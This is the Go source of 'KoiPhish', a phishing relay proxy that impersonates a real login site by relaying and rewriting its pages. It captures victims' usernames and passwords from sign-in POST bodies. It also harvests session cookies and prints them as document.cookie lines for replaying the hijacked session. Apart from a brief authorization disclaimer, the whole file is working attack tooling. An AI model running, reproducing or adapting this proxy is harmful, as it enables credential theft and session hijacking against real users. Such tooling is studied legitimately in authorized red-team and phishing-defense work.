///////////////////////////////////////////////////////////////////////////////
/// KoiPhish - A simple yet beautiful relay proxy.
/// This KoiPhish targets a common login flow and can be customized.
/// December 2018,  MIT License
///////////////////////////////////////////////////////////////////////////////
/// Disclaimer: Make sure you have proper authorization before pen testing.
///             Don't do anything illegal.
///////////////////////////////////////////////////////////////////////////////

package main

import (
	"bytes"
	"compress/gzip"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"strings"
	"time"
)

///////////////////////////////////////////////////////////////////////////////
/// Begin Configuration
///
/// Constants that define the Koiphish relay configuration
///
/// _target:         target server/URL to relay to and from
/// _sourceDomain:   site/domain KoiPhish is hosted at
/// _requestsToDump: requests/response with that URL will be
///                  written to the log file
/// _successRoute:   when this handler is called auth completed
///                  and we can redirect the client off KoiPhish
/// _cookiesToLookFor:
///                  cookies to look for in response from target and
///                  which domain the should be set on
/// _requestsToIgnore:
///                  these requests will not be processed by the proxy
/// _addtionalCustomBodyRewrites:
///                 custom _targetHost.Host replacements in reply body
///////////////////////////////////////////////////////////////////////////////

const _target string = "<put_target_server>"
const _sourceHost string = "localhost"
const _successRoute = "/CheckCookie"

var _cookiesToLookFor = map[string]string{}

var _requestsToDump = []string{"_/signin/sl/challenge", "_/signin/sl/lookup"}
var _requestsToIgnore = []string{"/_/common/diagnostics", "/cspreport", "/jserror", "/info"}
var _addtionalCustomBodyRewrites = []string{}

////////////////////////////////////////////////////////////////////////////////////////////
/// End Configuration
////////////////////////////////////////////////////////////////////////////////////////////

/////////////////////////////////////////////////////////////////
/// targetURL - url.Parse() of target. Set by initialize()
/////////////////////////////////////////////////////////////////
var _targetURL *url.URL

/////////////////////////////////////////////////////////////////
/// targetDomain - (e.g. https://target). Set by initialize()
/////////////////////////////////////////////////////////////////
var _targetDomain string

/////////////////////////////////////////////////////////////////
/// _logfile - Set by initialize()
/////////////////////////////////////////////////////////////////
var _logfile *os.File

///////////////////////////////////////////////////////////////////////////////
/// Initialize KoiPhish.
/// Setup log file and set target variables
///////////////////////////////////////////////////////////////////////////////
func initialize() {

	//create the log file
	starttime := time.Now()
	os.Mkdir("logs", 0644)
	filename := "./logs/koiphish." + starttime.Format("2006-01-02_150405") + ".log"

	_logfile, err := os.OpenFile(filename, os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Println(err)
	}
	log.SetOutput(_logfile)
	//defer _logfile.Close()

	//parse and set the globals
	_targetURL, err = url.Parse(_target)
	if err != nil {
		panic(err)
	}

	_targetDomain = _targetURL.Scheme + "://" + _targetURL.Host

	log.Println("KoiPhish started.")
	log.Println("Target: " + _targetDomain)
	log.Println("Logfile: " + filename)
}

///////////////////////////////////////////////////////////////////////////////
/// Look through the HTTP header to find cookies
/// If cookies of interest are found the are written to
/// the log file and also printed out right away
///////////////////////////////////////////////////////////////////////////////
func checkForCookies(response *http.Response, content string) string {

	cookies := ""

	for i := 0; i < len(response.Cookies()); i++ {

		currentCookie := response.Cookies()[i]
		for name, domain := range _cookiesToLookFor {

			if currentCookie.Name == name {
				setcookie := "document.cookie=\"" + currentCookie.Name + "=" + currentCookie.Value + ";Domain=" + domain + "\""
				cookies += setcookie + "\n"
				log.Println(setcookie)
			}
		}
	}

	return cookies
}

///////////////////////////////////////////////////////////////////////////////
/// Update headers for the relay request to  patch
/// a few things like host, user agent
///////////////////////////////////////////////////////////////////////////////
func rewriteHeaders(request *http.Request, sourceRequest *http.Request) {

	//Note: only patches the very first header[0], which seems good enough
	//Consider replacing all occurences here.
	for key, value := range sourceRequest.Header {
		neworig := strings.Replace(value[0], _sourceHost, _targetURL.Host, -1)
		request.Header.Set(key, neworig)
	}

	//update headers, so everything looks legit
	request.Header.Set("Host", _targetURL.Host)

	//set this explicilty - golang seems to overwrite.
	request.Header.Set("User-Agent", sourceRequest.UserAgent())
}

///////////////////////////////////////////////////////////////////////////////
/// KoiPhish Main
/// This is where all the magic happens
///////////////////////////////////////////////////////////////////////////////
func main() {

	initialize()

	fmt.Println("KoiPhish started.")

	//Main Generic Proxy Request Handler
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {

		log.Println("Request " + r.RequestURI + " received from " + r.RemoteAddr)
		dumpRequest(r)

		//rewrite potential query params to real target
		updatedRequestURL := strings.Replace(r.RequestURI, _sourceHost, _targetURL.Host, -1)
		destinationURL := _targetDomain + updatedRequestURL

		//create a basic request (this handles any GET requests)
		request, _ := http.NewRequest(r.Method, destinationURL, r.Body)

		//If the request is a POST we look for credentials in the body and rewrite links
		if r.Method == "POST" {

			postBody, err := ioutil.ReadAll(r.Body)
			if err != nil {
				log.Printf("Error reading post body: %v", err)
				http.Error(w, "", http.StatusBadRequest)
				return
			}

			//check if there are anything of interest in the body
			analyzeBody(r, string(postBody))

			//fix any invalid domain names in the body (assuming the post is a text for now)
			postBodyString := strings.Replace(string(postBody), _sourceHost, _targetURL.Host, -1)

			requestBody := bytes.NewReader([]byte(postBodyString))
			request, err = http.NewRequest(r.Method,
				destinationURL,
				requestBody)
		}

		//assign headers and rewrite some to make request more legit
		request.Header = r.Header
		rewriteHeaders(request, r)

		//Issue the relay request to the target web server
		resp, err := http.DefaultClient.Do(request)
		if err != nil {
			log.Printf("Error issueing request: %v", err)
			http.Error(w, "", http.StatusBadRequest)
			return
		}
		defer resp.Body.Close()

		dumpResponse(resp)

		//read the response body
		content, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Printf("Error reading uncompressed body: %v", err)
			http.Error(w, "", http.StatusBadRequest)
			return
		}

		//Do we have to decompress before editing links?
		if resp.Header.Get("Content-Encoding") == "gzip" {
			content = decompress(content)
		}

		cookies := checkForCookies(resp, string(content))
		if cookies != "" {
			fmt.Println(cookies)
		}

		//update links
		content = []byte(updateBody(string(content), _targetDomain))

		//Compress it again?
		if resp.Header.Get("Content-Encoding") == "gzip" {
			content = compress(content)
		}

		//attach headers to response
		for key, value := range resp.Header {

			if key == "Content-Length" {
				w.Header().Add(key, string(len(content)))
				continue
			}

			for _, valueToSet := range value {

				temp := strings.Split(_targetURL.Host, ".")
				topLevel := "." + temp[len(temp)-2] + "." + temp[len(temp)-1]

				//we want to set all the cookies on the proxy site
				//this means we have to update the domain names on cookies
				if key == "Set-Cookie" {
					valueToSet = strings.Replace(valueToSet, ";Domain="+topLevel, "", -1)
				}

				w.Header().Add(key, valueToSet)
			}
		}

		w.Write(content)
	})

	http.HandleFunc(_successRoute, func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, _target, 302)
	})

	//Ignore a couple of common telemetry requests...
	for i := 0; i < len(_requestsToIgnore); i++ {
		http.HandleFunc(_requestsToIgnore[i], blackholeRequest)
	}

	//Start the TLS server
	http.ListenAndServeTLS(":443", "server.crt", "server.key", nil)
}

///////////////////////////////////////////////////////////////////////////////
/// Handler to ignore requests
///////////////////////////////////////////////////////////////////////////////
func blackholeRequest(w http.ResponseWriter, r *http.Request) {
	http.Error(w, "Not applicable.", http.StatusBadRequest)
	return
}

///////////////////////////////////////////////////////////////////////////////
/// Helper function to decompress the HTTP body payload
///////////////////////////////////////////////////////////////////////////////
func decompress(data []byte) []byte {
	content := []byte("")

	zip, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		log.Printf("Error decompressing: %v", err)
	}
	defer zip.Close()

	content, err = ioutil.ReadAll(zip)
	if err != nil {
		log.Printf("Error reading decompressed data: %v", err)
	}

	return content
}

///////////////////////////////////////////////////////////////////////////////
/// Helper function to compress the HTTP body payload
///////////////////////////////////////////////////////////////////////////////
func compress(content []byte) []byte {
	var tempbuffer bytes.Buffer
	zipit := gzip.NewWriter(&tempbuffer)
	zipit.Write(content)
	zipit.Flush()
	defer zipit.Close()

	content = tempbuffer.Bytes()
	return content
}

///////////////////////////////////////////////////////////////////////////////
/// Helper function to write a request to log file
///////////////////////////////////////////////////////////////////////////////
func dumpRequest(r *http.Request) {

	for i := 0; i < len(_requestsToDump); i++ {
		if strings.Index(r.RequestURI, _requestsToDump[i]) >= 0 {
			dump, err := httputil.DumpRequest(r, true)
			if err != nil {
				log.Println(err)
			}

			log.Printf("Client Request ("+r.RemoteAddr+"):\n%q\n", string(dump))
		}
	}
}

///////////////////////////////////////////////////////////////////////////////
/// Helper function to write a response to log file
///////////////////////////////////////////////////////////////////////////////
func dumpResponse(r *http.Response) {

	for i := 0; i < len(_requestsToDump); i++ {
		if strings.Index(r.Request.RequestURI, _requestsToDump[i]) >= 0 {

			dump, err := httputil.DumpResponse(r, true)
			if err != nil {
				log.Println(err)
			}

			log.Printf("Target Response (initial requestor IP "+r.Request.RemoteAddr+"):\n%q\n", string(dump))
		}
	}
}

/////////////////////////////////////////////////////////////////
/// updateBody
/// rewrite URLs in the requests to ensure links are working
/////////////////////////////////////////////////////////////////
func updateBody(body string, targetDomain string) string {

	//these rewrites are to make sure the subsquent rewrite doesn't incorrectly update absolute URLs
	body = strings.Replace(body, " src=\"//", " src=\"https://", -1)
	body = strings.Replace(body, " src='//", " src='https://", -1)
	body = strings.Replace(body, " href=\"//", " href=\"https://", -1)
	body = strings.Replace(body, " href='//", " href='https://", -1)

	//regular rewrites start here
	body = strings.Replace(body, " \"url\": \"/\"", " \"url\": \""+_targetDomain+"/", -1)
	body = strings.Replace(body, " href=\"/", " href=\""+_targetDomain+"/", -1)
	body = strings.Replace(body, " href='/", " href='"+_targetDomain+"/", -1)

	body = strings.Replace(body, " content=\"/", " content=\""+_targetDomain+"/", -1)
	body = strings.Replace(body, " content='/", " content='"+_targetDomain+"/", -1)

	body = strings.Replace(body, " src=\"/", " src=\""+_targetDomain+"/", -1)
	body = strings.Replace(body, " src='/", " src='"+_targetDomain+"/", -1)

	//Below rewrites are for cross domain requests
	//we have to make them appear as if they would be on the same site
	body = strings.Replace(body, _targetURL.Host, _sourceHost, -1)

	//Additional configurable custom XHR/AJAX rewrites
	for i := 0; i < len(_addtionalCustomBodyRewrites); i++ {
		body = strings.Replace(body, _addtionalCustomBodyRewrites[i], _sourceHost, -1)
	}

	return body
}

///////////////////////////////////////////////////////////////////////////////
/// Helper method for analyzeing and parsing http response for things
/// This needs customization depending on the target website
///////////////////////////////////////////////////////////////////////////////
func analyzeBody(r *http.Request, postBody string) {

	//check if username was posted
	if strings.Index(r.RequestURI, "_/signin/sl/lookup") >= 0 {
		username := checkForUsername(string(postBody))
		log.Println("Username: " + username)
		fmt.Println("Username: " + username)
	}

	//check if credentials were posted
	if strings.Index(r.RequestURI, "_/signin/sl/challenge") >= 0 {
		cred := checkForCredential(string(postBody))
		log.Println("Password: " + cred)
		fmt.Println("Password: " + cred)
	}

}

///////////////////////////////////////////////////////////////////////////////
/// Specific for the basic target. Hacky, but quick way to read username
/// This needs adjustments for other scenarios
///////////////////////////////////////////////////////////////////////////////
func checkForUsername(body string) string {

	//hacky, but quick way to read credential
	beginidx := strings.Index(body, "f.req")
	body, _ = url.QueryUnescape(body[beginidx:])

	user := strings.Split(body, "[")

	if len(user) >= 2 {
		user = strings.Split(user[1], "\"")

		if len(user) >= 2 {
			fmt.Println("Username: " + user[1])
			return user[1]
		}
	}

	return ""
}

///////////////////////////////////////////////////////////////////////////////
/// Specific for the basic target. Hacky, but quick way to read username
/// This needs adjustments for other scenarios
///////////////////////////////////////////////////////////////////////////////
func checkForCredential(body string) string {

	//hacky, but quick way to read credential
	beginidx := strings.Index(body, "f.req")
	body, _ = url.QueryUnescape(body[beginidx:])

	password := strings.Split(body, "[")

	if len(password) >= 4 {
		password = strings.Split(password[3], "\"")

		if len(password) >= 2 {
			fmt.Println("Password: " + password[1])
			return password[1]
		}
	}

	return ""
}
